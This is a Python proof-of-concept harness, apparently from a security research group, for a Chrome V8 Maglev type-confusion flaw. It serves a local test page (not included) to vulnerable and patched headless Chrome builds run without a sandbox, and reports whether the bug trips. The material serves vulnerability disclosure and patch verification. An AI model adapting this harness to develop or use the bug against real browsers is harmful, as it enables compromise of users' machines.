#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Mail    : abraxas.null@proton.me
#
#  CVE: CVE-2026-126910 (High)
#  Vendor: Google Chrome / V8
#  Versions: Chrome < 157.0.8103.78
#  Impact: Maglev type confusion: object/array literals can write a prototype map and a stale load returns WRONG
#  Requires: Docker linux-arm64, Chrome for Testing 157.0.8103.50 and 157.0.8103.78
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "CVE-2026-126910"
_EMAIL = "abraxas.null@proton.me"

_RST = "\033[0m"
_BLD = "\033[1m"
_CYAN = (0, 255, 249)
_MAGENTA = (255, 0, 212)
_PINK = (255, 77, 224)
_GREEN = (57, 255, 20)
_GOLD = (255, 230, 0)
_AMBER = (255, 201, 70)
_RED = (255, 64, 96)
_MUTED = (140, 155, 175)
_INK = (232, 255, 248)
_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    if not _on():
        return ""
    return f"\033[38;2;{r};{g};{b}m"


def _paint(text, rgb, bold=False):
    if not text or rgb is None:
        return text or ""
    prefix = _rgb(*rgb) + (_BLD if bold else "")
    return "".join(ch if ch == " " else prefix + ch for ch in text)


def _box(inner, border):
    edge = _rgb(*border) + "║" + _RST
    return edge + " " + inner + _RST + " " + edge


def _rule(left, right, border, width):
    return _rgb(*border) + left + "═" * (width - 2) + right + _RST


def _split(text, left_end, right_start, left_rgb, right_rgb, mid_rgb=None, left_bold=False):
    return (
        _paint(text[:left_end], left_rgb, bold=left_bold)
        + _paint(text[left_end:right_start], mid_rgb)
        + _paint(text[right_start:], right_rgb)
    )


def _fit(left, right, width, fill=" "):
    gap = max(width - len(left) - len(right), 1)
    return (left + fill * gap + right)[:width].ljust(width)


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line):
    width = max(len(line), 1)
    out = []
    quoted = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        quoted ^= ch == '"'
        if ch == '"':
            color = _AMBER if quoted else _GOLD
        elif quoted:
            color = _GOLD
        else:
            color = _rain(x, width)
        out.append(_rgb(*color) + ch)
    return "".join(out) + _RST


def _banner_width(cols):
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(row) for row in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    return content_w, box_w


def _title_row(width):
    left, right = " ABRAXAS LABS", "analyze · reverse · disclose"
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _CYAN, _MUTED, left_bold=True)


def _cve_row(width):
    left, right = " " + _CVE, "authorized research only"
    rest = max(width - len(left) - len(right), 3)
    text = (left + " local lab ".center(rest)[:rest] + right)[:width].ljust(width)
    return _split(text, len(left), width - len(right), _PINK, _GREEN, mid_rgb=_MAGENTA, left_bold=True)


def _mail_row(width):
    left, right = " Mail", _EMAIL
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _GOLD, _CYAN)


def _status_line():
    marks = {"[": _GREEN, "]": _GREEN, "*": _GREEN, "·": _PINK, "#": _PINK}
    text = "[*]  abraxas!null ready on #labs"
    return "".join(ch if ch == " " else _rgb(*marks.get(ch, _INK)) + ch for ch in text) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    content_w, box_w = _banner_width(cols)
    lines = [
        _rule("╔", "╗", _CYAN, box_w),
        _box(_title_row(content_w) + _RST, _CYAN),
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_cve_row(content_w) + _RST, _MAGENTA),
        _rule("╠", "╣", _MAGENTA, box_w),
    ]
    for glyph in _ART["abraxas"] + _ART["labs"]:
        vis = glyph[:content_w].ljust(content_w)
        lines.append(_box(_logo_line(vis), _MAGENTA))
    lines.extend([
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_mail_row(content_w) + _RST, _MAGENTA),
        _rule("╚", "╝", _CYAN, box_w),
        " " + _status_line(),
    ])
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _message_color(s):
    low = s.lower()
    stripped = s.lstrip()
    if low.startswith("success"):
        return _rgb(*_GREEN) + _BLD
    if low.startswith("fail"):
        return _rgb(*_RED) + _BLD
    if "user_id" in low:
        return _rgb(*_AMBER) + _BLD
    if low.startswith("status=") or "status=" in low[:20]:
        return _rgb(*_CYAN)
    if low.startswith("carrier"):
        return _rgb(*_MAGENTA)
    if stripped[:1] in "{[":
        return _rgb(*_GOLD)
    return _rgb(*_INK)


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    dest = kwargs.get("file", _sys.stdout)
    if dest is not _sys.stdout and dest is not _sys.stderr:
        _PRINT(*args, **kwargs)
        return
    extra = {k: v for k, v in kwargs.items() if k != "sep"}
    _PRINT(_message_color(s) + s + _RST, **extra)

print_abraxas_banner()
_PRINT = _builtins.print
_builtins.print = _cprint

"""CVE-2026-126910 Maglev object/array-literal witness.

Official regress-575525282-2.js and -3.js, served to Chrome for Testing.
Vulnerable pin returns the stale property or loses the renderer.
Patched pin still returns TRUE. Release CFT is not ASan. No forged pointers.
"""


import json
import os
import shutil
import signal
import subprocess
import threading
import time
from dataclasses import dataclass
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

LABEL = "CVE-2026-126910"
WITNESS = "CVE-2026-126910-TYPECONF-WITNESS"
HOST = "127.0.0.1"
PORT = 18630
VULN = "157.0.8103.50"
FIXED = "157.0.8103.78"
CASES = ("object", "array")
OUT = Path("/out")
LAB = Path("/lab")
PAGE = LAB / "poc.html"
OPTIMIZED = 1 << 3
MAGLEVVED = 1 << 4
CASE_TIMEOUT_S = 45.0
CRASH_NEEDLES = (
    "received signal",
    "sigsegv",
    "sigbus",
    "check failed",
    "fatal error",
    "aw, snap",
    "renderer process gone",
    "status_breakpoint",
)
JS_FLAGS = "--js-flags=--allow-natives-syntax --maglev --no-turbofan"

LINES: list[str] = []


def log(msg: str) -> None:
    print(msg, flush=True)
    LINES.append(msg)


@dataclass
class CaseResult:
    version: str
    case: str
    exit_code: int | None
    value: str | None
    warm_opt: str | None
    status_before: int | None
    status_after: int | None
    fast_before: bool | None
    fast_after: bool | None
    thrown: str | None
    crashed: bool
    detail: str


class _Report:
    def __init__(self) -> None:
        self.payload: dict[str, object] | None = None
        self.event = threading.Event()

    def reset(self) -> None:
        self.payload = None
        self.event = threading.Event()

    def store(self, payload: dict[str, object]) -> None:
        self.payload = payload
        self.event.set()


REPORT = _Report()


def finish(code: int) -> int:
    OUT.mkdir(parents=True, exist_ok=True)
    (OUT / "poc-last-run.txt").write_text("\n".join(LINES) + "\n", encoding="utf-8")
    return code


def chrome_bin(version: str) -> Path:
    return Path(f"/opt/chrome/{version}/chrome-linux-arm64/chrome")


def _as_int(value: object) -> int | None:
    if isinstance(value, bool) or not isinstance(value, int):
        return None
    return value


def _as_bool(value: object) -> bool | None:
    if isinstance(value, bool):
        return value
    return None


def _as_str(value: object) -> str | None:
    if value is None:
        return None
    if isinstance(value, str):
        return value
    return None


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def _send(self, status: int, body: bytes, content_type: str) -> None:
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self) -> None:  # noqa: N802
        path = self.path.split("?", 1)[0]
        if path == "/health":
            self._send(200, b"OK", "text/plain")
            return
        if path in ("/", "/poc.html", "/case/object", "/case/array"):
            body = PAGE.read_bytes() if PAGE.is_file() else b""
            self._send(200, body, "text/html; charset=utf-8")
            return
        self._send(404, b"missing", "text/plain")

    def do_POST(self) -> None:  # noqa: N802
        length = int(self.headers.get("Content-Length", "0") or 0)
        raw = self.rfile.read(min(length, 100_000)) if length else b""
        if self.path.split("?", 1)[0] != "/report":
            self._send(404, b"missing", "text/plain")
            return
        try:
            payload = json.loads(raw.decode("utf-8"))
        except json.JSONDecodeError:
            self._send(400, b"bad-json", "text/plain")
            return
        if isinstance(payload, dict):
            REPORT.store(payload)
        self._send(204, b"", "text/plain")

    def log_message(self, fmt: str, *args: object) -> None:
        return


def start_http() -> ThreadingHTTPServer:
    ThreadingHTTPServer.allow_reuse_address = True
    httpd = ThreadingHTTPServer((HOST, PORT), Handler)
    thread = threading.Thread(target=httpd.serve_forever, name="http", daemon=True)
    thread.start()
    return httpd


def kill_chrome() -> None:
    for name in ("chrome", "chrome_crashpad_handler", "chrome_crashpad"):
        subprocess.run(
            ["pkill", "-9", name],
            check=False,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    time.sleep(0.3)


def crash_line(text: str) -> str:
    for line in text.splitlines():
        low = line.lower()
        if any(needle in low for needle in CRASH_NEEDLES):
            return line.strip()[:240]
    return ""


def maglevved(status: int | None) -> bool:
    if status is None:
        return False
    return (status & OPTIMIZED) != 0 and (status & MAGLEVVED) != 0


def armed(result: CaseResult) -> bool:
    return (
        not result.crashed
        and result.warm_opt == "TRUE"
        and result.fast_before is False
        and maglevved(result.status_before)
        and result.thrown is None
    )


def confused(result: CaseResult) -> bool:
    if result.crashed:
        return True
    if not armed(result):
        return False
    return result.value != "TRUE" or bool(result.thrown)


def fixed_ok(result: CaseResult) -> bool:
    return (
        armed(result)
        and result.value == "TRUE"
        and not result.thrown
        and result.fast_after is True
    )


def run_case(version: str, case: str) -> CaseResult:
    REPORT.reset()
    kill_chrome()
    profile = Path(f"/tmp/cft-{version}-{case}")
    shutil.rmtree(profile, ignore_errors=True)
    profile.mkdir(parents=True, exist_ok=True)
    log_path = Path(f"/tmp/cft-{version}-{case}.log")
    url = f"http://{HOST}:{PORT}/case/{case}"
    argv = [
        str(chrome_bin(version)),
        f"--user-data-dir={profile}",
        "--headless=new",
        "--no-sandbox",
        "--disable-gpu",
        "--disable-dev-shm-usage",
        "--no-first-run",
        "--no-default-browser-check",
        "--disable-sync",
        "--disable-extensions",
        "--disable-background-networking",
        "--noerrdialogs",
        "--disable-breakpad",
        JS_FLAGS,
        url,
    ]
    handle = log_path.open("w", encoding="utf-8")
    proc = subprocess.Popen(
        argv,
        stdout=handle,
        stderr=subprocess.STDOUT,
        start_new_session=True,
        text=True,
    )
    reported = REPORT.event.wait(CASE_TIMEOUT_S)
    if proc.poll() is None:
        try:
            os.killpg(proc.pid, signal.SIGKILL)
        except OSError:
            pass
    try:
        exit_code: int | None = proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        exit_code = None
    handle.close()
    log_text = log_path.read_text(encoding="utf-8", errors="replace") if log_path.is_file() else ""
    needle = crash_line(log_text)
    payload = REPORT.payload if reported else None
    crashed = payload is None and bool(needle or exit_code not in (None, 0, -9, 137))
    if payload is not None:
        detail = "reported"
    elif needle:
        detail = needle
    else:
        tail = " | ".join(line.strip() for line in log_text.splitlines()[-6:] if line.strip())
        detail = f"no-report {tail[:300]}"
    value = _as_str(payload.get("value")) if payload else None
    return CaseResult(
        version=version,
        case=case,
        exit_code=exit_code,
        value=value,
        warm_opt=_as_str(payload.get("warmOpt")) if payload else None,
        status_before=_as_int(payload.get("statusBefore")) if payload else None,
        status_after=_as_int(payload.get("statusAfter")) if payload else None,
        fast_before=_as_bool(payload.get("fastBefore")) if payload else None,
        fast_after=_as_bool(payload.get("fastAfter")) if payload else None,
        thrown=_as_str(payload.get("thrown")) if payload else None,
        crashed=crashed,
        detail=detail,
    )


def chrome_version(version: str) -> str:
    proc = subprocess.run(
        [str(chrome_bin(version)), "--version", "--no-sandbox"],
        check=False,
        capture_output=True,
        text=True,
        timeout=30,
    )
    text = (proc.stdout or proc.stderr).strip().splitlines()
    return text[0] if text else f"missing rc={proc.returncode}"


def summarize(result: CaseResult) -> None:
    optimized_after = (
        result.status_after is not None and (result.status_after & OPTIMIZED) != 0
    )
    log(
        "IOC case"
        f" version={result.version}"
        f" case={result.case}"
        f" value={result.value}"
        f" warmOpt={result.warm_opt}"
        f" fastBefore={result.fast_before}"
        f" fastAfter={result.fast_after}"
        f" statusBefore={result.status_before}"
        f" statusAfter={result.status_after}"
        f" maglev={maglevved(result.status_before)}"
        f" optimizedAfter={optimized_after}"
        f" thrown={result.thrown}"
        f" crashed={result.crashed}"
        f" exit={result.exit_code}"
        f" detail={result.detail}"
    )


def verdict(results: dict[tuple[str, str], CaseResult]) -> str:
    diffs: list[str] = []
    for case in CASES:
        vuln = results[(VULN, case)]
        fixed = results[(FIXED, case)]
        if confused(fixed) and not confused(vuln):
            return f"FAIL {LABEL} patched-tripped case={case} {WITNESS}"
        if confused(vuln) and fixed_ok(fixed):
            diffs.append(case)
    if diffs:
        how = "stale-load" if any(
            results[(VULN, case)].value not in (None, "TRUE") for case in diffs
        ) else "renderer-crash"
        return f"SUCCESS {LABEL} maglev-literal-{how} cases={','.join(diffs)} {WITNESS}"
    if all(item.crashed for item in results.values()):
        return f"FAIL {LABEL} both-crashed {WITNESS}"
    if not any(armed(item) or item.crashed for item in results.values()):
        return f"FAIL {LABEL} not-armed {WITNESS}"
    return f"FAIL {LABEL} neither-tripped {WITNESS}"


def main() -> int:
    log(f"IOC label={LABEL}")
    log(f"IOC witness={WITNESS}")
    log("IOC loopback=127.0.0.1:18630")
    log(
        "IOC bug=maglev-CreateObjectLiteral-CreateArrayLiteral-missing-CanWrite"
        " cwe=CWE-843"
    )
    for version in (VULN, FIXED):
        binary = chrome_bin(version)
        if not binary.is_file():
            log(f"FAIL {LABEL} missing-chrome {version} {WITNESS}")
            return finish(1)
        log(f"IOC chrome-bin version={version} {chrome_version(version)}")
    httpd = start_http()
    try:
        results: dict[tuple[str, str], CaseResult] = {}
        for version in (VULN, FIXED):
            for case in CASES:
                log(f"== {version} {case} ==")
                result = run_case(version, case)
                results[(version, case)] = result
                summarize(result)
        last = verdict(results)
        log(last)
        return finish(0 if last.startswith("SUCCESS ") else 1)
    except Exception as exc:  # noqa: BLE001 — process edge, still emit the oracle line
        log(f"IOC exception={type(exc).__name__}:{exc}")
        log(f"FAIL {LABEL} exception {WITNESS}")
        return finish(1)
    finally:
        httpd.shutdown()
        kill_chrome()


if __name__ == "__main__":
    raise SystemExit(main())

